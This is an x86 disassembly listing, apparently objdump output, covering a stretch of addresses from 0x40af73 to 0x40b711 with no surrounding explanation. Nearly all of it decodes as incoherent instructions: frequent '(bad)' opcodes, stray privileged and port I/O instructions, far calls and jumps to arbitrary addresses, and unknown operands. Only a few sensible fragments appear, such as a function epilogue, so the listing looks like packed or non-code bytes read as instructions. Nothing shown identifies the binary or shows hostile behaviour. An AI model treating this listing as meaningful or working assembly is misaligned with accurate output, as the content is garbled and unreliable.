  40af73:	or     BYTE PTR [edi-0x33],al
  40af76:	js     0x40af7a
  40af78:	in     eax,0xda
  40af7a:	(bad)  
  40af7b:	int3   
  40af7c:	dec    esi
  40af7d:	call   0xa95a36a4
  40af82:	mov    edi,0xcede08f6
  40af87:	inc    edx
  40af88:	and    al,BYTE PTR [ebx-0x5c6bd3c3]
  40af8e:	(bad)  
  40af8f:	mov    eax,0x7fb2c586
  40af94:	mov    edx,DWORD PTR [eax]
  40af96:	imul   edx,edx,0xf89ea9ed
  40af9c:	mov    DWORD PTR [eax],edx
  40af9e:	mov    eax,DWORD PTR [ebp-0xc]
  40afa1:	jmp    0x40b2ba
  40afa6:	sar    DWORD PTR ds:0xc9d9c1c9,cl
  40afac:	fcmovne st,st(5)
  40afae:	mov    bl,0x22
  40afb0:	fsub   st(2),st
  40afb2:	xchg   ebx,eax
  40afb3:	inc    edi
  40afb4:	sbb    dl,BYTE PTR [edx+edx*8+0x74787885]
  40afbb:	jle    0x40b035
  40afbd:	js     0x40affb
  40afbf:	xchg   esi,eax
  40afc0:	and    bl,BYTE PTR [ecx]
  40afc2:	fisubr WORD PTR [ebx-0x4bf71172]
  40afc8:	loop   0x40afbc
  40afca:	inc    eax
  40afcb:	clts   
  40afcd:	test   BYTE PTR [ecx+0x3d28f069],bl
  40afd3:	call   0x774a2b0d
  40afd8:	imul   esi,DWORD PTR [ecx-0x7808f172],0xabac00b4
  40afe2:	(bad)  [edi-0x4b86aa74]
  40afe8:	mov    WORD PTR [ebx+0x0],?
  40afeb:	sbb    BYTE PTR [edi],ch
  40afed:	xchg   ecx,eax
  40afee:	div    BYTE PTR [ecx+0x4087a1bd]
  40aff4:	sar    BYTE PTR [eax+esi*2],cl
  40aff7:	dec    esi
  40aff8:	pop    ebx
  40aff9:	push   esi
  40affa:	jae    0x40af88
  40affc:	mov    al,BYTE PTR [edx+0x6e]
  40afff:	adc    al,0x67
  40b001:	and    DWORD PTR [edi+0x395129d5],0xfffffffd
  40b008:	jg     0x40b063
  40b00a:	pop    eax
  40b00b:	imul   ebx,DWORD PTR [edx+0x6cafec44],0x1537676c
  40b015:	in     eax,0x65
  40b017:	cmc    
  40b018:	(bad)  
  40b019:	fldcw  WORD PTR [eax]
  40b01b:	cmp    BYTE PTR [edi+0x14],cl
  40b01e:	mov    dl,0x3a
  40b020:	mov    ds:0x3f2a8933,al
  40b025:	pop    ebp
  40b026:	mov    ecx,0xd5076895
  40b02b:	sbb    ah,ch
  40b02d:	dec    ecx
  40b02e:	jp     0x40b068
  40b030:	ret    
  40b031:	loope  0x40afd7
  40b033:	xchg   edx,eax
  40b034:	scas   al,BYTE PTR es:[edi]
  40b035:	shl    DWORD PTR ds:0xf70fe97f,0x55
  40b03c:	push   eax
  40b03d:	jecxz  0x40b067
  40b03f:	pop    edi
  40b040:	outs   dx,DWORD PTR ds:[esi]
  40b041:	ds sub al,0x60
  40b044:	mov    bl,0x59
  40b046:	aas    
  40b047:	pusha  
  40b048:	mov    ds:0x687964b5,eax
  40b04d:	jecxz  0x40b03f
  40b04f:	jg     0x40b078
  40b051:	jnp    0x40aff2
  40b053:	add    DWORD PTR [edx],0xd1f1e40e
  40b059:	and    al,0xad
  40b05b:	in     eax,dx
  40b05c:	and    DWORD PTR [ebx],ecx
  40b05e:	add    DWORD PTR [edi+0xf6e482e],esp
  40b064:	add    al,0xc6
  40b066:	jo     0x40affe
  40b068:	xchg   ecx,eax
  40b069:	jae    0x40b0df
  40b06b:	inc    ebp
  40b06c:	jge    0x40b047
  40b06e:	imul   ebp,edi,0xffffff8d
  40b071:	add    BYTE PTR [ecx+0x7429741b],bl
  40b077:	test   eax,0xf8aa0e00
  40b07c:	or     ch,BYTE PTR [edi]
  40b07e:	repnz sbb dl,BYTE PTR [ecx-0x1b7bed4d]
  40b085:	repz and al,0x6f
  40b088:	mov    ds:0xcc8b9220,al
  40b08d:	add    DWORD PTR [esi+0x70ea0742],edx
  40b093:	pop    edx
  40b094:	in     eax,dx
  40b095:	jne    0x40b0fe
  40b097:	inc    ecx
  40b098:	push   0xa76075cf
  40b09d:	je     0x40b041
  40b09f:	jg     0x40b104
  40b0a1:	jo     0x40b104
  40b0a3:	xchg   edi,eax
  40b0a4:	in     al,dx
  40b0a5:	adc    eax,DWORD PTR [edi]
  40b0a7:	jg     0x40b033
  40b0a9:	mov    eax,ds:0x1260e1fb
  40b0ae:	cmp    esp,DWORD PTR [esi]
  40b0b0:	aas    
  40b0b1:	add    ebp,DWORD PTR [edx-0x56]
  40b0b4:	int3   
  40b0b5:	ss jnp 0x40b092
  40b0b8:	jb     0x40b0b3
  40b0ba:	xlat   BYTE PTR ds:[ebx]
  40b0bb:	test   eax,0x1d6fde25
  40b0c0:	rcl    BYTE PTR [esi-0xbafb37],1
  40b0c6:	in     eax,dx
  40b0c7:	aas    
  40b0c8:	pop    eax
  40b0c9:	ror    bl,1
  40b0cb:	inc    eax
  40b0cc:	iret   
  40b0cd:	enter  0x35b6,0xb1
  40b0d1:	call   0x78fb6247
  40b0d6:	mov    esi,0xab5e4985
  40b0db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b0dc:	xchg   ebx,eax
  40b0dd:	xchg   edi,eax
  40b0de:	ins    DWORD PTR es:[edi],dx
  40b0df:	into   
  40b0e0:	sub    DWORD PTR [edx+edi*4],edx
  40b0e3:	inc    edi
  40b0e4:	mov    ah,0x7a
  40b0e6:	mov    fs,WORD PTR [ebp+0x758e452c]
  40b0ec:	xchg   BYTE PTR [eax-0x5c518508],dh
  40b0f2:	jbe    0x40b120
  40b0f4:	icebp  
  40b0f5:	mov    ah,0xdf
  40b0f7:	repnz mov edx,0x2d461577
  40b0fd:	or     al,0x85
  40b0ff:	or     DWORD PTR [ecx+0x450d12a5],0xfe31ef67
  40b109:	push   edx
  40b10a:	or     dl,BYTE PTR [ecx+0x66d034b2]
  40b110:	jb     0x40b0d5
  40b112:	push   esi
  40b113:	mov    ?,WORD PTR [eax+0x36]
  40b116:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b117:	add    DWORD PTR [esi+0x55],0x1e63f60b
  40b11e:	sub    cl,BYTE PTR [esi-0x77]
  40b121:	push   ecx
  40b122:	rol    BYTE PTR ds:0x221250b6,1
  40b128:	pop    ebp
  40b129:	jbe    0x40b0ac
  40b12b:	cwde   
  40b12c:	jle    0x40b121
  40b12e:	rcr    ebp,cl
  40b130:	jecxz  0x40b0d3
  40b132:	repz (bad) 
  40b134:	xor    edi,DWORD PTR [esi+0x2cd70b11]
  40b13a:	xchg   BYTE PTR [eax+edx*8],ah
  40b13d:	test   DWORD PTR [eax+0x3b2f42f8],eax
  40b143:	dec    edi
  40b144:	inc    esi
  40b145:	aas    
  40b146:	std    
  40b147:	out    dx,al
  40b148:	and    BYTE PTR [eax+0x42632388],ah
  40b14e:	adc    BYTE PTR [ecx-0x2ac03e3],bl
  40b154:	stos   BYTE PTR es:[edi],al
  40b155:	in     eax,dx
  40b156:	xchg   esi,eax
  40b157:	(bad)  
  40b158:	xlat   BYTE PTR ds:[ebx]
  40b159:	adc    BYTE PTR [ebx-0x1f164560],0x2d
  40b160:	pusha  
  40b161:	das    
  40b162:	je     0x40b1d4
  40b164:	xlat   BYTE PTR ds:[ebx]
  40b165:	cli    
  40b166:	xchg   edx,eax
  40b167:	mov    al,0xe1
  40b169:	cmp    DWORD PTR [eax+0x6],ecx
  40b16c:	dec    edi
  40b16d:	add    esp,DWORD PTR [edx-0x43]
  40b170:	mov    al,0xf7
  40b172:	pushf  
  40b173:	cld    
  40b174:	and    ah,BYTE PTR [edi-0x5770ab93]
  40b17a:	popf   
  40b17b:	jbe    0x40b13f
  40b17d:	std    
  40b17e:	mov    DWORD PTR [esi],eax
  40b180:	push   esi
  40b181:	cmp    DWORD PTR ds:0x907e00eb,esi
  40b187:	enter  0xdd4f,0x68
  40b18b:	sbb    al,0x77
  40b18d:	test   BYTE PTR [ebp-0x4c7f4b5d],cl
  40b193:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b194:	sbb    ebp,DWORD PTR [ebp-0x2765a4a3]
  40b19a:	xlat   BYTE PTR ds:[ebx]
  40b19b:	jo     0x40b21a
  40b19d:	xchg   edi,eax
  40b19e:	push   ss
  40b19f:	push   edx
  40b1a0:	enter  0xefef,0xb2
  40b1a4:	test   DWORD PTR [eax-0x33b406ee],ecx
  40b1aa:	jl     0x40b191
  40b1ac:	adc    BYTE PTR [eax+0x31f60632],ch
  40b1b2:	xchg   esi,eax
  40b1b3:	xor    dh,BYTE PTR ds:0xdb9fba47
  40b1b9:	(bad)  
  40b1ba:	jg     0x40b145
  40b1bc:	jns    0x40b225
  40b1be:	(bad)  
  40b1bf:	xchg   ebx,eax
  40b1c0:	aad    0x5e
  40b1c2:	mov    eax,ds:0x58680d10
  40b1c7:	pop    eax
  40b1c8:	add    DWORD PTR [edx+0x4b5336c2],esi
  40b1ce:	jecxz  0x40b208
  40b1d0:	xor    ebx,ebp
  40b1d2:	cmc    
  40b1d3:	fdiv   DWORD PTR [eax]
  40b1d5:	push   esp
  40b1d6:	sub    eax,0x1837bf9e
  40b1db:	pop    ecx
  40b1dc:	xchg   DWORD PTR [edi+eiz*1],esp
  40b1df:	mov    WORD PTR [esi-0x5d9ef968],ss
  40b1e5:	inc    ebx
  40b1e6:	or     esp,DWORD PTR [ebp+0x16]
  40b1e9:	dec    edx
  40b1ea:	imul   edi,DWORD PTR [ebx],0x130463ef
  40b1f0:	inc    edi
  40b1f1:	das    
  40b1f2:	frstor [ecx]
  40b1f4:	pusha  
  40b1f5:	sub    DWORD PTR [ecx-0x4a],ebx
  40b1f8:	cmp    eax,edi
  40b1fa:	in     eax,0x66
  40b1fc:	call   0x43f7:0xab6a9fa
  40b203:	cmp    ebp,edi
  40b205:	push   ss
  40b206:	mov    edx,0x4bf4b844
  40b20b:	iret   
  40b20c:	mov    bh,BYTE PTR [esi+eiz*4-0x4b]
  40b210:	mul    DWORD PTR [edi-0x3a]
  40b213:	mov    al,ds:0xbc62f53d
  40b218:	jl     0x40b275
  40b21a:	and    ch,BYTE PTR [edx-0x45]
  40b21d:	adc    eax,0xf84db3d2
  40b222:	add    bl,BYTE PTR [esi+0x69]
  40b225:	in     eax,dx
  40b226:	and    BYTE PTR [esp+esi*1+0x21],cl
  40b22a:	sub    eax,0x88f8836
  40b22f:	js     0x40b25c
  40b231:	xchg   edi,eax
  40b232:	mov    dl,0x29
  40b234:	call   0x7c29:0x88ddc913
  40b23b:	mov    esi,ebx
  40b23d:	push   eax
  40b23e:	or     BYTE PTR [esi],bh
  40b240:	jp     0x40b24c
  40b242:	out    dx,eax
  40b243:	in     al,dx
  40b244:	shr    BYTE PTR [edi],cl
  40b246:	dec    ebp
  40b247:	jno    0x40b265
  40b249:	xor    ah,BYTE PTR [ecx]
  40b24b:	test   eax,0x691762aa
  40b250:	jle    0x40b211
  40b252:	sahf   
  40b253:	test   BYTE PTR [edi-0x6b],bl
  40b256:	xor    DWORD PTR [ebx+0x2c6cd7c4],ebp
  40b25c:	call   DWORD PTR [eax]
  40b25e:	xchg   edx,eax
  40b25f:	out    0x82,al
  40b261:	repz repz or ah,BYTE PTR [edi-0xa]
  40b266:	mov    eax,ds:0x22f26636
  40b26b:	js     0x40b255
  40b26d:	mov    BYTE PTR [eax-0x1],ah
  40b270:	mov    ah,BYTE PTR [edx-0x5679bb0c]
  40b276:	mov    ebx,0xbcd4f8d0
  40b27b:	inc    BYTE PTR [edx+0x7ec77841]
  40b281:	mov    edi,0xb84c8bff
  40b286:	jmp    0x40b296
  40b288:	xchg   ecx,eax
  40b289:	push   ecx
  40b28a:	test   al,0x7e
  40b28c:	add    BYTE PTR [esi+0x6a],cl
  40b28f:	mov    ecx,0x93a857f7
  40b294:	push   es
  40b295:	mov    bh,0x80
  40b297:	std    
  40b298:	fcmove st,st(2)
  40b29a:	jg     0x40b28a
  40b29c:	pop    ebx
  40b29d:	push   0x25
  40b29f:	dec    edx
  40b2a0:	loopne 0x40b26d
  40b2a2:	fsubr  st(0),st
  40b2a4:	xor    ah,al
  40b2a6:	fdivr  QWORD PTR [ebp-0x78]
  40b2a9:	dec    esp
  40b2aa:	cmc    
  40b2ab:	adc    al,0x16
  40b2ad:	mov    edi,0xbcf8d8fb
  40b2b2:	outs   dx,BYTE PTR ds:[esi]
  40b2b3:	into   
  40b2b4:	add    eax,0x15e942ae
  40b2b9:	sar    DWORD PTR ds:0x82927a76,0xe9
  40b2c0:	adc    al,0x3
  40b2c2:	add    BYTE PTR [eax],al
  40b2c4:	rol    al,cl
  40b2c6:	(bad)  
  40b2c7:	leave  
  40b2c8:	fcmove st,st(1)
  40b2ca:	rcl    edi,1
  40b2cc:	pop    ss
  40b2cd:	mov    ecx,0xd8bbb132
  40b2d2:	xor    al,0x9b
  40b2d4:	into   
  40b2d5:	mov    bh,BYTE PTR [eax+0x78]
  40b2d8:	je     0x40b358
  40b2da:	js     0x40b354
  40b2dc:	repz lahf 
  40b2de:	je     0x40b306
  40b2e0:	out    0x6,al
  40b2e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b2e3:	add    dl,dh
  40b2e5:	loopne 0x40b30e
  40b2e7:	int    0x9f
  40b2e9:	push   0x8e98ff65
  40b2ee:	popf   
  40b2ef:	test   dl,bl
  40b2f1:	mov    eax,ds:0x41c9dba6
  40b2f6:	push   ds
  40b2f7:	mov    ds:0xc64eadd1,eax
  40b2fc:	dec    esi
  40b2fd:	sar    BYTE PTR [ebp+eiz*1+0x32f0a47a],0x4b
  40b305:	xchg   esi,eax
  40b306:	push   ss
  40b307:	enter  0x694e,0xfd
  40b30b:	add    al,0x2a
  40b30d:	cli    
  40b30e:	jge    0x40b2ec
  40b310:	xchg   ecx,eax
  40b311:	inc    edi
  40b312:	mov    esp,DWORD PTR [eax+0xb]
  40b315:	mov    ch,0xa0
  40b317:	cmp    al,0x9d
  40b319:	pusha  
  40b31a:	in     eax,0xd
  40b31c:	push   edx
  40b31d:	pop    edi
  40b31e:	lahf   
  40b31f:	mov    edi,0xf0a8fc4e
  40b324:	addr16 sbb esp,ecx
  40b327:	sbb    al,0x14
  40b329:	call   0xff3f:0x1fb6ee1b
  40b330:	shr    BYTE PTR [ebx-0x11],1
  40b333:	ds jmp 0x40b394
  40b336:	add    al,BYTE PTR [ecx]
  40b338:	jecxz  0x40b2d6
  40b33a:	mov    edi,0xea8d16ae
  40b33f:	es mov eax,0xe41f470b
  40b345:	popf   
  40b346:	loop   0x40b362
  40b348:	adc    bh,BYTE PTR [edx+0x284a96e1]
  40b34e:	and    ch,BYTE PTR [ebp+0x5d]
  40b351:	xchg   ebp,eax
  40b352:	ror    BYTE PTR [edi+0x29],0xba
  40b356:	jecxz  0x40b3d3
  40b358:	jno    0x40b3aa
  40b35a:	test   BYTE PTR [eax],dh
  40b35c:	ja     0x40b359
  40b35e:	add    al,0xbb
  40b360:	(bad)  
  40b361:	push   cs
  40b362:	cld    
  40b363:	dec    edx
  40b364:	mov    cl,0xea
  40b366:	(bad)  
  40b367:	dec    ecx
  40b368:	mov    fs,WORD PTR [ebx]
  40b36a:	add    BYTE PTR [ebx+0x43],bl
  40b36d:	xor    edx,ecx
  40b36f:	pop    esi
  40b370:	xchg   esi,eax
  40b371:	nop
  40b372:	adc    al,0x49
  40b374:	mov    DWORD PTR [eax+0x5dc00bdf],ecx
  40b37a:	or     ebp,0x5e
  40b37d:	pop    ecx
  40b37e:	out    0x9f,eax
  40b380:	loop   0x40b3d9
  40b382:	add    BYTE PTR [eax+0x7b557a25],bh
  40b388:	xor    BYTE PTR [ebp+0x1c4ff89],0x75
  40b38f:	popa   
  40b390:	aas    
  40b391:	std    
  40b392:	add    al,0xf4
  40b394:	inc    eax
  40b395:	scas   al,BYTE PTR es:[edi]
  40b396:	fild   WORD PTR [esp+eiz*8+0x0]
  40b39a:	push   0x76f0e403
  40b39f:	stos   DWORD PTR es:[edi],eax
  40b3a0:	push   0x79787302
  40b3a5:	pop    ss
  40b3a6:	lea    esi,[edx+0x3f]
  40b3a9:	aaa    
  40b3aa:	rcr    DWORD PTR [edi-0x289de129],0x8e
  40b3b1:	push   cs
  40b3b2:	mov    DWORD PTR [ebp-0x74a8562c],esi
  40b3b8:	arpl   dx,dx
  40b3ba:	idiv   BYTE PTR [esi+ebp*4+0x7a93e23c]
  40b3c1:	lahf   
  40b3c2:	pop    eax
  40b3c3:	xor    dh,BYTE PTR cs:[eax]
  40b3c6:	test   esi,eax
  40b3c8:	(bad)  
  40b3c9:	dec    edx
  40b3ca:	push   ebx
  40b3cb:	pop    es
  40b3cc:	das    
  40b3cd:	aam    0xe8
  40b3cf:	repnz sbb DWORD PTR [eax-0x67],esi
  40b3d3:	cmp    bl,BYTE PTR [esi-0x69040ed6]
  40b3d9:	xor    esi,esp
  40b3db:	inc    edx
  40b3dc:	clc    
  40b3dd:	scas   eax,DWORD PTR es:[edi]
  40b3de:	je     0x40b395
  40b3e0:	add    ebp,DWORD PTR [ecx-0x3b23bef3]
  40b3e6:	sbb    ebp,esp
  40b3e8:	in     eax,0xf2
  40b3ea:	cmp    eax,0x97d1c1f2
  40b3ef:	popf   
  40b3f0:	test   BYTE PTR [ebx+0x349846df],ah
  40b3f6:	out    dx,eax
  40b3f7:	repnz dec bx
  40b3fa:	dec    eax
  40b3fb:	cmc    
  40b3fc:	mov    ah,0x7c
  40b3fe:	add    BYTE PTR [ebx],ch
  40b400:	rcl    edx,0x34
  40b403:	xor    BYTE PTR [edx+0x54],bl
  40b406:	enter  0x37aa,0x76
  40b40a:	inc    eax
  40b40b:	jmp    0x767d:0x12461d61
  40b412:	xor    dl,BYTE PTR [eax+0x5f635021]
  40b418:	in     eax,0x8
  40b41a:	jbe    0x40b483
  40b41c:	ins    BYTE PTR es:[edi],dx
  40b41d:	mov    ebx,0x8f18ff7b
  40b422:	mov    BYTE PTR [ecx],al
  40b424:	bound  esi,QWORD PTR ds:0x6eb5a1b2
  40b42a:	and    WORD PTR [ebx],cx
  40b42d:	pop    edx
  40b42e:	test   al,0x67
  40b430:	ds leave 
  40b432:	mov    ds,WORD PTR [edi+0xcb33609]
  40b438:	sub    cl,BYTE PTR [edi]
  40b43a:	mov    BYTE PTR [esi+0x53e06ae4],bl
  40b440:	mov    bl,cl
  40b442:	les    ecx,FWORD PTR [ecx+ebx*4-0x111acb56]
  40b449:	test   BYTE PTR [edi+eiz*1+0x11],bl
  40b44d:	add    DWORD PTR [ebp-0x15f5e943],ecx
  40b453:	xor    DWORD PTR [esi+0x5e],eax
  40b456:	add    DWORD PTR [ecx-0x8ab1a36],ecx
  40b45c:	and    eax,edi
  40b45e:	test   al,0xc1
  40b460:	ins    DWORD PTR es:[edi],dx
  40b461:	jnp    0x40b466
  40b463:	ins    BYTE PTR es:[edi],dx
  40b464:	sbb    eax,0x9a920aa9
  40b469:	xor    DWORD PTR [esi],ecx
  40b46b:	mov    fs,ecx
  40b46d:	push   0xde45c2e9
  40b472:	mov    bh,0xf4
  40b474:	mov    ch,0x41
  40b476:	pop    ecx
  40b477:	(bad)
  40b47a:	jb     0x40b485
  40b47c:	ficom  DWORD PTR [ecx]
  40b47e:	cmc    
  40b47f:	or     BYTE PTR [edx+0x73ae3d54],bh
  40b485:	push   es
  40b486:	lods   al,BYTE PTR ds:[esi]
  40b487:	or     eax,0x7ece854
  40b48c:	(bad)  
  40b48d:	aam    0x19
  40b48f:	dec    eax
  40b490:	loop   0x40b4fc
  40b492:	adc    bh,BYTE PTR [esi-0x75cbe835]
  40b498:	scas   eax,DWORD PTR es:[edi]
  40b499:	daa    
  40b49a:	out    dx,al
  40b49b:	mov    ebx,0xf07b85b1
  40b4a0:	popa   
  40b4a1:	test   DWORD PTR [edi-0x66],esi
  40b4a4:	into   
  40b4a5:	push   0x21a09483
  40b4aa:	jge    0x40b462
  40b4ac:	inc    edx
  40b4ad:	add    BYTE PTR [eax+ebp*4+0x6969279e],al
  40b4b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b4b5:	push   ebx
  40b4b6:	aad    0x5a
  40b4b8:	in     eax,0x2e
  40b4ba:	mov    eax,DWORD PTR [edx-0x23448b12]
  40b4c0:	xchg   edx,eax
  40b4c1:	xchg   edi,eax
  40b4c2:	pop    edi
  40b4c3:	push   ss
  40b4c4:	out    dx,eax
  40b4c5:	mov    DWORD PTR [ebx+0x7ccb067c],esi
  40b4cb:	int3   
  40b4cc:	ds jl  0x40b4f2
  40b4cf:	ins    BYTE PTR es:[edi],dx
  40b4d0:	push   ss
  40b4d1:	pop    ebx
  40b4d2:	cmp    eax,eax
  40b4d4:	jp     0x40b552
  40b4d6:	jbe    0x40b4be
  40b4d8:	mov    BYTE PTR [eax+0x53],ch
  40b4db:	mov    bh,al
  40b4dd:	sahf   
  40b4de:	cli    
  40b4df:	sub    cl,BYTE PTR [esi-0x1bc4cd9c]
  40b4e5:	add    edi,eax
  40b4e7:	cld    
  40b4e8:	iret   
  40b4e9:	(bad)  
  40b4ea:	lods   al,BYTE PTR ds:[esi]
  40b4eb:	push   edi
  40b4ec:	sti    
  40b4ed:	enter  0x62b9,0x7
  40b4f1:	(bad)  
  40b4f2:	dec    esi
  40b4f3:	mov    dl,0x74
  40b4f5:	sahf   
  40b4f6:	cmp    al,0xe8
  40b4f8:	or     DWORD PTR [eax-0x7f],ebp
  40b4fb:	jg     0x40b508
  40b4fd:	cdq    
  40b4fe:	adc    BYTE PTR [edx-0x9],ch
  40b501:	outs   dx,BYTE PTR ds:[esi]
  40b502:	daa    
  40b503:	inc    esp
  40b504:	mov    eax,ds:0x26c5330e
  40b509:	push   cs
  40b50a:	xchg   ebx,eax
  40b50b:	les    ecx,FWORD PTR [ebx+0x65]
  40b50e:	pop    es
  40b50f:	add    al,0xc
  40b511:	dec    eax
  40b512:	push   ds
  40b513:	inc    eax
  40b514:	add    ecx,DWORD PTR [eax-0x46]
  40b517:	mov    ah,0xcb
  40b519:	jno    0x40b55f
  40b51b:	aam    0xab
  40b51d:	mov    bl,0x80
  40b51f:	pop    ebp
  40b520:	jns    0x40b57d
  40b522:	arpl   sp,sp
  40b524:	shr    BYTE PTR [edx-0x2ba715d2],1
  40b52a:	jne    0x40b50b
  40b52c:	adc    ebx,DWORD PTR [ebp+edx*2+0x4010bc14]
  40b533:	and    edi,0xffffff9e
  40b536:	sahf   
  40b537:	addr16 fwait
  40b539:	(bad)  
  40b53a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b53b:	pop    eax
  40b53c:	shl    eax,cl
  40b53e:	stos   DWORD PTR es:[edi],eax
  40b53f:	fsub   DWORD PTR [eax+0x4f864d54]
  40b545:	pop    edi
  40b546:	jl     0x40b569
  40b548:	arpl   WORD PTR [ebx],ax
  40b54a:	mov    al,bl
  40b54c:	sub    edi,ebp
  40b54e:	or     eax,0x74308f9a
  40b553:	sub    DWORD PTR [edx],ebp
  40b555:	pusha  
  40b556:	sbb    al,0x99
  40b558:	dec    ebx
  40b559:	cmp    al,0x28
  40b55b:	les    ebp,FWORD PTR [edx+0x7f8b543c]
  40b561:	mov    esi,0x86ca1698
  40b566:	lock xchg ah,ch
  40b569:	retf   0x14b0
  40b56c:	mov    al,ds:0x9b20fbf
  40b571:	test   eax,0x52f6bf7c
  40b576:	or     edx,DWORD PTR gs:[ebx]
  40b579:	das    
  40b57a:	mov    bl,0x9d
  40b57c:	inc    edx
  40b57d:	pop    ebx
  40b57e:	xchg   edx,eax
  40b57f:	sar    DWORD PTR [edi],cl
  40b581:	jno    0x40b5aa
  40b583:	aad    0x74
  40b585:	rcr    BYTE PTR [eax],0xb8
  40b588:	(bad)  
  40b589:	and    DWORD PTR [esi+0x68],edi
  40b58c:	pop    ss
  40b58d:	in     eax,0x3b
  40b58f:	fwait
  40b590:	add    DWORD PTR [ebx],esi
  40b592:	cmp    ah,BYTE PTR [edx]
  40b594:	jb     0x40b55d
  40b596:	cwde   
  40b597:	pop    ebx
  40b598:	xchg   BYTE PTR [esp+esi*4],dl
  40b59b:	ficomp WORD PTR [ebp+0x68]
  40b59e:	xor    BYTE PTR [eax+0x28],dh
  40b5a1:	jg     0x40b54f
  40b5a3:	mov    ecx,0xd60b0d7
  40b5a8:	stos   DWORD PTR es:[edi],eax
  40b5a9:	loope  0x40b55e
  40b5ab:	(bad)  
  40b5ac:	jmp    0x4d741523
  40b5b1:	sub    bl,BYTE PTR [esi+ebx*1-0x62]
  40b5b5:	imul   esp,DWORD PTR [edx+edi*1],0xac439051
  40b5bc:	aas    
  40b5bd:	(bad)  
  40b5be:	std    
  40b5bf:	xchg   edx,eax
  40b5c0:	mov    esi,0x70816b54
  40b5c5:	into   
  40b5c6:	inc    edx
  40b5c7:	sub    eax,0xdd79614f
  40b5cc:	ror    DWORD PTR [edx],1
  40b5ce:	xchg   BYTE PTR [eax+0x35],bl
  40b5d1:	push   ss
  40b5d2:	js     0x40b5c3
  40b5d4:	outs   dx,BYTE PTR ds:[esi]
  40b5d5:	mov    ds:0x840f87a2,eax
  40b5da:	pop    ss
  40b5db:	add    BYTE PTR [eax],al
  40b5dd:	add    BYTE PTR [ebx+0x881e445],cl
  40b5e3:	popf   
  40b5e4:	sbb    al,0x75
  40b5e6:	pusha  
  40b5e7:	mov    eax,DWORD PTR [ebp-0x8]
  40b5ea:	xor    eax,ecx
  40b5ec:	add    eax,esi
  40b5ee:	pop    edi
  40b5ef:	pop    esi
  40b5f0:	pop    ebx
  40b5f1:	leave  
  40b5f2:	ret    0x4
  40b5f5:	mov    eax,DWORD PTR [ebp-0xc]
  40b5f8:	add    eax,DWORD PTR [ebp-0x18]
  40b5fb:	jmp    0x40b914
  40b600:	leave  
  40b601:	xlat   BYTE PTR ds:[ebx]
  40b602:	ret    
  40b603:	rcl    cl,0xd4
  40b606:	leave  
  40b607:	fldcw  WORD PTR [esi-0x56332a7c]
  40b60d:	jns    0x40b63d
  40b60f:	pop    ecx
  40b610:	retf   0x788f
  40b613:	js     0x40b689
  40b615:	jle    0x40b68f
  40b617:	js     0x40b688
  40b619:	sbb    ecx,esi
  40b61b:	pop    DWORD PTR [ecx]
  40b61d:	sbb    al,0x67
  40b61f:	or     eax,0x43605d44
  40b624:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b625:	jmp    0x2cfe1625
  40b62a:	sub    DWORD PTR [edi+0x75981f2d],edi
  40b630:	mov    ebp,0xae166ef8
  40b635:	sbb    DWORD PTR [ecx],edx
  40b637:	xchg   cl,bh
  40b639:	cld    
  40b63a:	sar    dh,0x58
  40b63d:	imul   edi,DWORD PTR [esi+edx*4],0xad83abf4
  40b644:	push   ebp
  40b645:	cmp    ecx,eax
  40b647:	mov    edx,0x45fc26bd
  40b64c:	xchg   ecx,eax
  40b64d:	sub    BYTE PTR [edx+0x7a117917],bl
  40b653:	es (bad) 
  40b655:	push   ecx
  40b656:	adc    DWORD PTR [ebp-0x2268ed7f],ebx
  40b65c:	loop   0x40b671
  40b65e:	ret    
  40b65f:	sub    bh,BYTE PTR [esi-0x4e]
  40b662:	fwait
  40b663:	jp     0x40b642
  40b665:	pop    ecx
  40b666:	jle    0x40b627
  40b668:	fwait
  40b669:	mov    WORD PTR [edi-0x5ae8d142],?
  40b66f:	and    ecx,DWORD PTR [ecx+0x251dc87a]
  40b675:	dec    edx
  40b676:	xor    al,0x38
  40b678:	mov    cl,0x8e
  40b67a:	sub    cl,bh
  40b67c:	add    BYTE PTR [ecx+ebx*8+0x7e],bl
  40b680:	ja     0x40b642
  40b682:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b683:	mov    WORD PTR [edx-0x510f84fb],es
  40b689:	ins    DWORD PTR es:[edi],dx
  40b68a:	js     0x40b629
  40b68c:	(bad)
  40b68f:	xor    esp,DWORD PTR [edi]
  40b691:	add    ah,dl
  40b693:	gs jmp 0xd597:0x29f8dfba
  40b69b:	ss out 0xd2,al
  40b69e:	mov    al,ds:0xff70ed1b
  40b6a3:	je     0x40b652
  40b6a5:	popa   
  40b6a6:	adc    eax,ecx
  40b6a8:	mov    ebp,0x30277189
  40b6ad:	jae    0x40b67b
  40b6af:	ret    
  40b6b0:	pop    esi
  40b6b1:	sbb    BYTE PTR [eiz*2-0x2a003b0d],ch
  40b6b8:	stos   DWORD PTR es:[edi],eax
  40b6b9:	or     dh,BYTE PTR [ebx+eax*8+0x1f8c3c97]
  40b6c0:	or     BYTE PTR [esi+0x686ec459],dh
  40b6c6:	add    DWORD PTR [eax+ebp*4-0x25c0bcd1],ebp
  40b6cd:	jns    0x40b66e
  40b6cf:	enter  0x5dfd,0x7e
  40b6d3:	shl    edi,0xd0
  40b6d6:	sbb    BYTE PTR [edx+0x6ca17a1],ch
  40b6dc:	fcom   QWORD PTR [edx-0x50]
  40b6df:	sbb    eax,0xb1bd40f4
  40b6e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b6e5:	mov    WORD PTR [edi-0x20],ss
  40b6e8:	pop    ss
  40b6e9:	mov    BYTE PTR [esp+edi*1-0x27],0x98
  40b6ee:	and    eax,0xe1bcf1bc
  40b6f3:	mov    edi,DWORD PTR [ebp+0x6af20a3d]
  40b6f9:	xchg   edx,eax
  40b6fa:	or     ecx,DWORD PTR [ecx-0x33ef2667]
  40b700:	mov    WORD PTR [eax+edi*2+0x7a],es
  40b704:	es out dx,al
  40b706:	mov    bl,0xbf
  40b708:	fs inc ecx
  40b70a:	push   cs
  40b70b:	fwait
  40b70c:	jmp    DWORD PTR [esi+0x6f]
  40b70f:	mov    ch,0x6c
  40b711:	xchg   ecx,eax
